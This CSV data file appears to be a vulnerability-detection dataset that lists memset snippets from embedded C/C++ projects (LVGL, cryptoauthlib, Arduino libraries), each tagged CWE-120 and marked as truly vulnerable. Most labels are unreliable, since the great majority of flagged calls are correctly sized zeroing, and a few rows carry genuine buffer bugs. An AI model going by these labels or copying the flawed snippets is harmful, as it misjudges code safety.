GithubID,Year,FullPath,Codesnippet,CWE,isTrueVulnerable,Codesnippet5
2021\a9_gsm_gps_library\a9_mqtt_lib\src\mqtt_lib.c,Dataset Download,../../Dataset Download/2021\a9_gsm_gps_library\a9_mqtt_lib\src\mqtt_lib.c,"memset(&ci, 0, sizeof(MQTT_Connect_Info_t));",120,1,"    MQTT_Connect_Info_t ci;
    MQTT_Error_t err;
    memset(&ci, 0, sizeof(MQTT_Connect_Info_t));
    ci.client_id = client_id;
    ci.client_user = CLIENT_USER;
"
2021\a9_gsm_gps_library\a9_spi_lib\src\spi_example.c,Dataset Download,../../Dataset Download/2021\a9_gsm_gps_library\a9_spi_lib\src\spi_example.c,"memset(send_buff, 0, sizeof(send_buff));",120,1,"	send_buff = OS_Malloc(10);
	rev_buff = OS_Malloc(10);
	memset(send_buff, 0, sizeof(send_buff));
	memset(rev_buff, 0, sizeof(rev_buff));

"
2021\a9_gsm_gps_library\a9_spi_lib\src\spi_example.c,Dataset Download,../../Dataset Download/2021\a9_gsm_gps_library\a9_spi_lib\src\spi_example.c,"memset(rev_buff, 0, sizeof(rev_buff));",120,1,"	rev_buff = OS_Malloc(10);
	memset(send_buff, 0, sizeof(send_buff));
	memset(rev_buff, 0, sizeof(rev_buff));

	strcpy(send_buff, ""123456789"");
"
2021\a9_gsm_gps_library\a9_spi_lib\src\spi_example.c,Dataset Download,../../Dataset Download/2021\a9_gsm_gps_library\a9_spi_lib\src\spi_example.c,"memset(send_buff, 0xaa, sizeof(send_buff));",120,1,"	send_buff = OS_Malloc(4000);
	rev_buff = OS_Malloc(4000);
	memset(send_buff, 0xaa, sizeof(send_buff));
    memset(rev_buff, 0, sizeof(rev_buff));
    
"
2021\a9_gsm_gps_library\a9_spi_lib\src\spi_example.c,Dataset Download,../../Dataset Download/2021\a9_gsm_gps_library\a9_spi_lib\src\spi_example.c,"memset(send_buff, 0xab, 4000);",120,1,"	uint8_t *send_buff;
	send_buff = OS_Malloc(4000);
	memset(send_buff, 0xab, 4000);

	OS_Sleep(5000);
"
2021\arduino-learn-circuit\libraries\arduinoWebSockets-master\src\WebSocketsServer.cpp,Dataset Download,../../Dataset Download/2021\arduino-learn-circuit\libraries\arduinoWebSockets-master\src\WebSocketsServer.cpp,"memset(&_clients[0], 0x00, (sizeof(WSclient_t) * WEBSOCKETS_SERVER_CLIENT_MAX));",120,1,"    _mandatoryHttpHeaderCount = 0;

    memset(&_clients[0], 0x00, (sizeof(WSclient_t) * WEBSOCKETS_SERVER_CLIENT_MAX));
}

"
2021\arduino-learn-circuit\libraries\arduinoWebSockets-master\src\libsha1\libsha1.c,Dataset Download,../../Dataset Download/2021\arduino-learn-circuit\libraries\arduinoWebSockets-master\src\libsha1\libsha1.c,"memset(block, '\0', sizeof(block));",120,1,"    a = b = c = d = e = 0;
#ifdef SHA1HANDSOFF
    memset(block, '\0', sizeof(block));
#endif
}
"
2021\arduino-learn-circuit\libraries\arduinoWebSockets-master\src\libsha1\libsha1.c,Dataset Download,../../Dataset Download/2021\arduino-learn-circuit\libraries\arduinoWebSockets-master\src\libsha1\libsha1.c,"memset(context, '\0', sizeof(*context));",120,1,"    }
    /* Wipe variables */
    memset(context, '\0', sizeof(*context));
    memset(&finalcount, '\0', sizeof(finalcount));
}
"
2021\arduino-learn-circuit\libraries\arduinoWebSockets-master\src\libsha1\libsha1.c,Dataset Download,../../Dataset Download/2021\arduino-learn-circuit\libraries\arduinoWebSockets-master\src\libsha1\libsha1.c,"memset(&finalcount, '\0', sizeof(finalcount));",120,1,"    /* Wipe variables */
    memset(context, '\0', sizeof(*context));
    memset(&finalcount, '\0', sizeof(finalcount));
}
/* ================ end of sha1.c ================ */
"
2021\arduino-learn-circuit\libraries\pubsubclient-master\tests\src\receive_spec.cpp,Dataset Download,../../Dataset Download/2021\arduino-learn-circuit\libraries\pubsubclient-master\tests\src\receive_spec.cpp,"memset(bigPublish,'A',length);",120,1,"    byte publish[] = {0x30,length-2,0x0,0x5,0x74,0x6f,0x70,0x69,0x63,0x70,0x61,0x79,0x6c,0x6f,0x61,0x64};
    byte bigPublish[length];
    memset(bigPublish,'A',length);
    bigPublish[length] = 'B';
    memcpy(bigPublish,publish,16);
"
2021\arduino-learn-circuit\libraries\pubsubclient-master\tests\src\lib\IPAddress.cpp,Dataset Download,../../Dataset Download/2021\arduino-learn-circuit\libraries\pubsubclient-master\tests\src\lib\IPAddress.cpp,"memset(_address, 0, sizeof(_address));",120,1,"IPAddress::IPAddress()
{
    memset(_address, 0, sizeof(_address));
}

"
2021\aws-edukit-example\components\core2forAWS\sk6812\sk6812.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\core2forAWS\sk6812\sk6812.c,"memset(px->pixels, 0, px->pixel_count * (px->nbits/8));",120,1,"void np_clear(pixel_settings_t *px)
{
	memset(px->pixels, 0, px->pixel_count * (px->nbits/8));
}

"
2021\aws-edukit-example\components\core2forAWS\tft\lvgl\lvgl\src\lv_draw\lv_draw_rect.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\core2forAWS\tft\lvgl\lvgl\src\lv_draw\lv_draw_rect.c,"_lv_memset(mask_buf, opa, draw_area_w);",120,1,"                mask_res = LV_DRAW_MASK_RES_FULL_COVER;
                if(simple_mode == false) {
                    _lv_memset(mask_buf, opa, draw_area_w);
                    mask_res = lv_draw_mask_apply(mask_buf, vdb->area.x1 + draw_area.x1, vdb->area.y1 + h, draw_area_w);
                }
"
2021\aws-edukit-example\components\core2forAWS\tft\lvgl\lvgl\src\lv_draw\lv_draw_rect.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\core2forAWS\tft\lvgl\lvgl\src\lv_draw\lv_draw_rect.c,"_lv_memset(mask_buf, opa_tmp, w);",120,1,"            if(opa_tmp != LV_OPA_COVER || opa != LV_OPA_COVER) opa_tmp = (opa * opa_tmp) >> 8;

            _lv_memset(mask_buf, opa_tmp, w);

            if(simple_mode) {
"
2021\aws-edukit-example\components\core2forAWS\tft\lvgl\lvgl\src\lv_draw\lv_draw_rect.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\core2forAWS\tft\lvgl\lvgl\src\lv_draw\lv_draw_rect.c,"_lv_memset(mask_buf, dsc->shadow_opa, w);",120,1,"        fa.y2 = fa.y1;
        for(y = 0; y < h; y++) {
            _lv_memset(mask_buf, dsc->shadow_opa, w);
            mask_res = lv_draw_mask_apply(mask_buf, fa.x1, fa.y1, w);
            if(mask_res == LV_DRAW_MASK_RES_FULL_COVER) mask_res = LV_DRAW_MASK_RES_CHANGED;
"
2021\aws-edukit-example\components\core2forAWS\tft\lvgl\lvgl\src\lv_font\lv_font_loader.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\core2forAWS\tft\lvgl\lvgl\src\lv_font\lv_font_loader.c,"memset(font, 0, sizeof(lv_font_t));",120,1,"
    lv_font_t * font = lv_mem_alloc(sizeof(lv_font_t));
    memset(font, 0, sizeof(lv_font_t));

    lv_fs_file_t file;
"
2021\aws-edukit-example\components\core2forAWS\tft\lvgl\lvgl\src\lv_font\lv_font_loader.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\core2forAWS\tft\lvgl\lvgl\src\lv_font\lv_font_loader.c,"memset(cmaps, 0, cmaps_subtables_count * sizeof(lv_font_fmt_txt_cmap_t));",120,1,"        lv_mem_alloc(cmaps_subtables_count * sizeof(lv_font_fmt_txt_cmap_t));

    memset(cmaps, 0, cmaps_subtables_count * sizeof(lv_font_fmt_txt_cmap_t));

    font_dsc->cmaps = cmaps;
"
2021\aws-edukit-example\components\core2forAWS\tft\lvgl\lvgl\src\lv_font\lv_font_loader.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\core2forAWS\tft\lvgl\lvgl\src\lv_font\lv_font_loader.c,"memset(glyph_dsc, 0, loca_count * sizeof(lv_font_fmt_txt_glyph_dsc_t));",120,1,"                                              lv_mem_alloc(loca_count * sizeof(lv_font_fmt_txt_glyph_dsc_t));

    memset(glyph_dsc, 0, loca_count * sizeof(lv_font_fmt_txt_glyph_dsc_t));

    font_dsc->glyph_dsc = glyph_dsc;
"
2021\aws-edukit-example\components\core2forAWS\tft\lvgl\lvgl\src\lv_font\lv_font_loader.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\core2forAWS\tft\lvgl\lvgl\src\lv_font\lv_font_loader.c,"memset(font_dsc, 0, sizeof(lv_font_fmt_txt_dsc_t));",120,1,"                                       lv_mem_alloc(sizeof(lv_font_fmt_txt_dsc_t));

    memset(font_dsc, 0, sizeof(lv_font_fmt_txt_dsc_t));

    font->dsc = font_dsc;
"
2021\aws-edukit-example\components\core2forAWS\tft\lvgl\lvgl\src\lv_font\lv_font_loader.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\core2forAWS\tft\lvgl\lvgl\src\lv_font\lv_font_loader.c,"memset(kern_pair, 0, sizeof(lv_font_fmt_txt_kern_pair_t));",120,1,"        lv_font_fmt_txt_kern_pair_t * kern_pair = lv_mem_alloc(sizeof(lv_font_fmt_txt_kern_pair_t));

        memset(kern_pair, 0, sizeof(lv_font_fmt_txt_kern_pair_t));

        font_dsc->kern_dsc = kern_pair;
"
2021\aws-edukit-example\components\core2forAWS\tft\lvgl\lvgl\src\lv_font\lv_font_loader.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\core2forAWS\tft\lvgl\lvgl\src\lv_font\lv_font_loader.c,"memset(kern_classes, 0, sizeof(lv_font_fmt_txt_kern_classes_t));",120,1,"        lv_font_fmt_txt_kern_classes_t * kern_classes = lv_mem_alloc(sizeof(lv_font_fmt_txt_kern_classes_t));

        memset(kern_classes, 0, sizeof(lv_font_fmt_txt_kern_classes_t));

        font_dsc->kern_dsc = kern_classes;
"
2021\aws-edukit-example\components\core2forAWS\tft\lvgl\lvgl\src\lv_gpu\lv_gpu_nxp_vglite.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\core2forAWS\tft\lvgl\lvgl\src\lv_gpu\lv_gpu_nxp_vglite.c,"memset(&dst->yuv, 0, sizeof(dst->yuv));",120,1,"    dst->stride = stride;

    memset(&dst->yuv, 0, sizeof(dst->yuv));

    dst->memory = (void *) ptr;
"
2021\aws-edukit-example\components\core2forAWS\tft\lvgl\lvgl\src\lv_misc\lv_mem.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\core2forAWS\tft\lvgl\lvgl\src\lv_misc\lv_mem.c,"if(alloc != NULL) _lv_memset(alloc, 0xaa, size);",120,1,"
#if LV_MEM_ADD_JUNK
    if(alloc != NULL) _lv_memset(alloc, 0xaa, size);
#endif

"
2021\aws-edukit-example\components\core2forAWS\tft\lvgl\lvgl\src\lv_misc\lv_mem.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\core2forAWS\tft\lvgl\lvgl\src\lv_misc\lv_mem.c,"_lv_memset((void *)data, 0xbb, _lv_mem_get_size(data));",120,1,"
#if LV_MEM_ADD_JUNK
    _lv_memset((void *)data, 0xbb, _lv_mem_get_size(data));
#endif

"
2021\aws-edukit-example\components\core2forAWS\tft\lvgl\lvgl\src\lv_misc\lv_mem.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\core2forAWS\tft\lvgl\lvgl\src\lv_misc\lv_mem.c,"_lv_memset(mon_p, 0, sizeof(lv_mem_monitor_t));",120,1,"{
    /*Init the data*/
    _lv_memset(mon_p, 0, sizeof(lv_mem_monitor_t));
#if LV_MEM_CUSTOM == 0
    lv_mem_ent_t * e;
"
2021\aws-edukit-example\components\core2forAWS\tft\lvgl\lvgl\src\lv_misc\lv_mem.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\core2forAWS\tft\lvgl\lvgl\src\lv_misc\lv_mem.c,"LV_ATTRIBUTE_FAST_MEM void _lv_memset(void * dst, uint8_t v, size_t len)",120,1," * @param len number of byte to set
 */
LV_ATTRIBUTE_FAST_MEM void _lv_memset(void * dst, uint8_t v, size_t len)
{

"
2021\aws-edukit-example\components\core2forAWS\tft\lvgl\lvgl\src\lv_misc\lv_mem.h,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\core2forAWS\tft\lvgl\lvgl\src\lv_misc\lv_mem.h,"static inline void _lv_memset(void * dst, uint8_t v, size_t len)",120,1," * @param len number of byte to set
 */
static inline void _lv_memset(void * dst, uint8_t v, size_t len)
{
    memset(dst, v, len);
"
2021\aws-edukit-example\components\core2forAWS\tft\lvgl\lvgl\src\lv_misc\lv_mem.h,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\core2forAWS\tft\lvgl\lvgl\src\lv_misc\lv_mem.h,"memset(dst, v, len);",120,1,"static inline void _lv_memset(void * dst, uint8_t v, size_t len)
{
    memset(dst, v, len);
}

"
2021\aws-edukit-example\components\core2forAWS\tft\lvgl\lvgl\src\lv_misc\lv_mem.h,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\core2forAWS\tft\lvgl\lvgl\src\lv_misc\lv_mem.h,"memset(dst, 0x00, len);",120,1,"static inline void _lv_memset_00(void * dst, size_t len)
{
    memset(dst, 0x00, len);
}

"
2021\aws-edukit-example\components\core2forAWS\tft\lvgl\lvgl\src\lv_misc\lv_mem.h,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\core2forAWS\tft\lvgl\lvgl\src\lv_misc\lv_mem.h,"memset(dst, 0xFF, len);",120,1,"static inline void _lv_memset_ff(void * dst, size_t len)
{
    memset(dst, 0xFF, len);
}

"
2021\aws-edukit-example\components\core2forAWS\tft\lvgl\lvgl\src\lv_misc\lv_mem.h,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\core2forAWS\tft\lvgl\lvgl\src\lv_misc\lv_mem.h,"LV_ATTRIBUTE_FAST_MEM void _lv_memset(void * dst, uint8_t v, size_t len);",120,1," * @param len number of byte to set
 */
LV_ATTRIBUTE_FAST_MEM void _lv_memset(void * dst, uint8_t v, size_t len);

/**
"
2021\aws-edukit-example\components\core2forAWS\tft\lvgl\lvgl\src\lv_widgets\lv_canvas.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\core2forAWS\tft\lvgl\lvgl\src\lv_widgets\lv_canvas.c,"_lv_memset((uint8_t *)dsc->data + 8, color.full ? 0xff : 0x00, row_byte_cnt * dsc->header.h);",120,1,"        uint32_t row_byte_cnt = (dsc->header.w + 7) >> 3;
        /*+8 skip the palette*/
        _lv_memset((uint8_t *)dsc->data + 8, color.full ? 0xff : 0x00, row_byte_cnt * dsc->header.h);
    }
    else if(dsc->header.cf == LV_IMG_CF_ALPHA_1BIT) {
"
2021\aws-edukit-example\components\core2forAWS\tft\lvgl\lvgl\src\lv_widgets\lv_canvas.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\core2forAWS\tft\lvgl\lvgl\src\lv_widgets\lv_canvas.c,"_lv_memset((uint8_t *)dsc->data, opa > LV_OPA_50 ? 0xff : 0x00, row_byte_cnt * dsc->header.h);",120,1,"    else if(dsc->header.cf == LV_IMG_CF_ALPHA_1BIT) {
        uint32_t row_byte_cnt = (dsc->header.w + 7) >> 3;
        _lv_memset((uint8_t *)dsc->data, opa > LV_OPA_50 ? 0xff : 0x00, row_byte_cnt * dsc->header.h);
    }
    else {
"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\app\ip_protection\symmetric_authentication.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\app\ip_protection\symmetric_authentication.c,"memset(&temp_key, 0, sizeof(temp_key));",120,1,"
        // Setup nonce command
        memset(&temp_key, 0, sizeof(temp_key));
        memset(&nonce_params, 0, sizeof(nonce_params));
        nonce_params.mode = NONCE_MODE_SEED_UPDATE;
"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\app\ip_protection\symmetric_authentication.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\app\ip_protection\symmetric_authentication.c,"memset(&nonce_params, 0, sizeof(nonce_params));",120,1,"        // Setup nonce command
        memset(&temp_key, 0, sizeof(temp_key));
        memset(&nonce_params, 0, sizeof(nonce_params));
        nonce_params.mode = NONCE_MODE_SEED_UPDATE;
        nonce_params.zero = 0;
"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\app\ip_protection\symmetric_authentication.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\app\ip_protection\symmetric_authentication.c,"memset(&temp_key_derive, 0, sizeof(temp_key_derive));",120,1,"        }

        memset(&temp_key_derive, 0, sizeof(temp_key_derive));
        temp_key_derive.valid = 1;
        memcpy(temp_key_derive.value, sn, sizeof(sn)); // 32 bytes TempKey ( SN[0:8] with padded 23 zeros used in symmetric key calculation)
"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\app\ip_protection\symmetric_authentication.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\app\ip_protection\symmetric_authentication.c,"memset(&mac_params, 0, sizeof(mac_params));",120,1,"
        // Setup MAC command
        memset(&mac_params, 0, sizeof(mac_params));
        mac_params.mode = MAC_MODE_BLOCK2_TEMPKEY | MAC_MODE_INCLUDE_SN; // Block 1 is a key, block 2 is TempKey
        mac_params.key_id = slot;
"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\app\secure_boot\secure_boot.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\app\secure_boot\secure_boot.c,"memset((void*)secure_boot_params, 0, sizeof(secure_boot_parameters));",120,1,"
    /*Reset all parameters before starting the process */
    memset((void*)secure_boot_params, 0, sizeof(secure_boot_parameters));

    /*Read Configuration data & verify device configuration settings*/
"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\atca_execution.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\atca_execution.c,"memset(packet->data, 0, sizeof(packet->data));",120,1,"        do
        {
            memset(packet->data, 0, sizeof(packet->data));
            // receive the response
            rxsize = sizeof(packet->data);
"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\atcacert\atcacert_date.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\atcacert\atcacert_date.c,"memset(timestamp, 0, sizeof(*timestamp));",120,1,"    }

    memset(timestamp, 0, sizeof(*timestamp));

    new_pos = str_to_int(cur_pos, 4, &timestamp->tm_year);
"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\atcacert\atcacert_date.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\atcacert\atcacert_date.c,"memset(enc_dates, 0, 3);",120,1,"    }

    memset(enc_dates, 0, 3);

    enc_dates[0] = (enc_dates[0] & 0x07) | (((issue_date->tm_year + 1900 - 2000) & 0x1F) << 3);
"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\atcacert\atcacert_date.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\atcacert\atcacert_date.c,"memset(issue_date, 0, sizeof(*issue_date));",120,1,"    }

    memset(issue_date, 0, sizeof(*issue_date));
    memset(expire_date, 0, sizeof(*expire_date));

"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\atcacert\atcacert_date.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\atcacert\atcacert_date.c,"memset(expire_date, 0, sizeof(*expire_date));",120,1,"
    memset(issue_date, 0, sizeof(*issue_date));
    memset(expire_date, 0, sizeof(*expire_date));

    issue_date->tm_year = (enc_dates[0] >> 3) + 2000 - 1900;
"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\atcacert\atcacert_def.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\atcacert\atcacert_def.c,"memset(build_state, 0, sizeof(*build_state));",120,1,"    }

    memset(build_state, 0, sizeof(*build_state));

    build_state->cert_def      = cert_def;
"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\atcacert\atcacert_def.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\atcacert\atcacert_def.c,"memset(large_sig, 0xFF, sizeof(large_sig));",120,1,"        // the cert buffer is large enough early in the cert rebuilding process.
        uint8_t large_sig[64];
        memset(large_sig, 0xFF, sizeof(large_sig));
        ret = atcacert_set_signature(
            build_state->cert_def,
"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\atcacert\atcacert_def.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\atcacert\atcacert_def.c,"memset(&comp_cert[67], 0, 2);",120,1,"    if (ret == ATCACERT_E_ELEM_MISSING)
    {
        memset(&comp_cert[67], 0, 2);  // No signer ID in cert, use 0
    }
    else if (ret != ATCACERT_E_SUCCESS)
"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\atcacert\atcacert_def.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\atcacert\atcacert_def.c,"memset(&padded_key[36], 0, 4);",120,1,"{
    memmove(&padded_key[40], &raw_key[32], 32); // Move Y to padded position
    memset(&padded_key[36], 0, 4);              // Add Y padding bytes
    memmove(&padded_key[4], &raw_key[0], 32);   // Move X to padded position
    memset(&padded_key[0], 0, 4);               // Add X padding bytes
"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\atcacert\atcacert_def.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\atcacert\atcacert_def.c,"memset(&padded_key[0], 0, 4);",120,1,"    memset(&padded_key[36], 0, 4);              // Add Y padding bytes
    memmove(&padded_key[4], &raw_key[0], 32);   // Move X to padded position
    memset(&padded_key[0], 0, 4);               // Add X padding bytes
}

"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\atcacert\atcacert_der.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\atcacert\atcacert_der.c,"memset(raw_sig, 0, 64);",120,1,"    if (raw_sig != NULL)
    {
        memset(raw_sig, 0, 64);  // Zero out the raw sig as the decoded integers may not touch all bytes

    }
"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\basic\atca_basic.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\basic\atca_basic.c,"memset(i2c_buses, -1, sizeof(i2c_buses));",120,1,"#ifdef ATCA_HAL_I2C
    int i2c_buses[MAX_BUSES];
    memset(i2c_buses, -1, sizeof(i2c_buses));
    hal_i2c_discover_buses(i2c_buses, MAX_BUSES);

"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\basic\atca_basic.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\basic\atca_basic.c,"memset(swi_buses, -1, sizeof(swi_buses));",120,1,"#ifdef ATCA_HAL_SWI
    int swi_buses[MAX_BUSES];
    memset(swi_buses, -1, sizeof(swi_buses));
    hal_swi_discover_buses(swi_buses, MAX_BUSES);
    for (i = 0; i < MAX_BUSES && iface_num < max_ifaces; i++)
"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\basic\atca_basic.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\basic\atca_basic.c,"memset(uart_buses, -1, sizeof(uart_buses));",120,1,"#ifdef ATCA_HAL_UART
    int uart_buses[MAX_BUSES];
    memset(uart_buses, -1, sizeof(uart_buses));
    hal_uart_discover_buses(uart_buses, MAX_BUSES);
    for (i = 0; i < MAX_BUSES && iface_num < max_ifaces; i++)
"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\basic\atca_basic.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\basic\atca_basic.c,"memset(cdc_buses, -1, sizeof(cdc_buses));",120,1,"#ifdef ATCA_HAL_KIT_CDC
    int cdc_buses[MAX_BUSES];
    memset(cdc_buses, -1, sizeof(cdc_buses));
    hal_kit_cdc_discover_buses(cdc_buses, MAX_BUSES);
    for (i = 0; i < MAX_BUSES && iface_num < max_ifaces; i++)
"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\basic\atca_basic.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\basic\atca_basic.c,"memset(hid_buses, -1, sizeof(hid_buses));",120,1,"#ifdef ATCA_HAL_KIT_HID
    int hid_buses[MAX_BUSES];
    memset(hid_buses, -1, sizeof(hid_buses));
    hal_kit_hid_discover_buses(hid_buses, MAX_BUSES);
    for (i = 0; i < MAX_BUSES && iface_num < max_ifaces; i++)
"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\basic\atca_basic_aes_cbc.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\basic\atca_basic_aes_cbc.c,"memset(ctx, 0, sizeof(*ctx));",120,1,"    }

    memset(ctx, 0, sizeof(*ctx));
    ctx->key_id = key_id;
    ctx->key_block = key_block;
"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\basic\atca_basic_aes_ctr.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\basic\atca_basic_aes_ctr.c,"memset(&ctx->cb[AES_DATA_SIZE - ctx->counter_size], 0, ctx->counter_size);",120,1,"    {
        // Counter overflowed
        memset(&ctx->cb[AES_DATA_SIZE - ctx->counter_size], 0, ctx->counter_size);
    }

"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\basic\atca_basic_aes_gcm.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\basic\atca_basic_aes_gcm.c,"memset(&pad_bytes[data_size], 0, sizeof(pad_bytes) - data_size);",120,1,"    {
        memcpy(pad_bytes, data, data_size);
        memset(&pad_bytes[data_size], 0, sizeof(pad_bytes) - data_size);

        for (xor_index = 0; xor_index < AES_DATA_SIZE; xor_index++)
"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\basic\atca_basic_aes_gcm.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\basic\atca_basic_aes_gcm.c,"memset(&cb[AES_DATA_SIZE - counter_size], 0, counter_size);",120,1,"    {
        // Counter overflowed
        memset(&cb[AES_DATA_SIZE - counter_size], 0, counter_size);
    }

"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\basic\atca_basic_aes_gcm.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\basic\atca_basic_aes_gcm.c,"memset(ghash_data, 0, AES_DATA_SIZE);",120,1,"        }

        memset(ghash_data, 0, AES_DATA_SIZE);
        length = ATCA_UINT32_HOST_TO_BE((uint32_t)(iv_size * 8));
        memcpy(&ghash_data[12], &length, sizeof(length));
"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\basic\atca_basic_aes_gcm.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\basic\atca_basic_aes_gcm.c,"memset(temp_data, 0, AES_DATA_SIZE);",120,1,"    }

    memset(temp_data, 0, AES_DATA_SIZE);
    length = ATCA_UINT64_HOST_TO_BE(((uint64_t)ctx->aad_size) * 8);
    memcpy(&temp_data[0], &length, sizeof(length));
"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\basic\atca_basic_checkmac.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\basic\atca_basic_checkmac.c,"memset(&packet.data[0], 0, CHECKMAC_CLIENT_CHALLENGE_SIZE);",120,1,"        else
        {
            memset(&packet.data[0], 0, CHECKMAC_CLIENT_CHALLENGE_SIZE);
        }
        memcpy(&packet.data[32], response, CHECKMAC_CLIENT_RESPONSE_SIZE);
"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\basic\atca_basic_ecdh.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\basic\atca_basic_ecdh.c,"memset(&io_dec_params, 0, sizeof(io_dec_params));",120,1,"
    // Decrypt PMS
    memset(&io_dec_params, 0, sizeof(io_dec_params));
    io_dec_params.io_key = io_key;
    io_dec_params.out_nonce = out_nonce;
"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\basic\atca_basic_lock.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\basic\atca_basic_lock.c,"memset(&packet, 0, sizeof(packet));",120,1,"
    // build command for lock zone and send
    memset(&packet, 0, sizeof(packet));
    packet.param1 = mode;
    packet.param2 = summary_crc;
"
